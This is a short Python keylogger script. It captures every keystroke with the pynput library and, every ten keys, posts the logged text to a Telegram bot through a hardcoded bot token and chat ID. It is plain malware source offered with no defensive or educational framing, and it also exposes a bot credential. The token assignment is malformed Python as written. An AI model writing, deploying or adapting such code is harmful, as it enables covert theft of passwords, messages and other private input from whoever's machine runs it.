from pynput import keyboard
import requests

# === CONFIGURATION ===
BOT_TOKEN = 8103947376:AAGB0T993QhJKHDd2jW319dqewWMvEx9HLc
CHAT_ID = 6268879709
SEND_EVERY_N_KEYS = 10

# === VARIABLES ===
key_log = []
key_count = 0

def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

def on_press(key):
    global key_log, key_count

    try:
        key_log.append(key.char)
    except AttributeError:
        # Special keys (e.g., space, shift)
        key_log.append(f'[{key.name}]')

    key_count += 1

    if key_count >= SEND_EVERY_N_KEYS:
        message = ''.join(key_log)
        send_to_telegram(message)
        key_log = []
        key_count = 0

# === START LISTENING ===
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
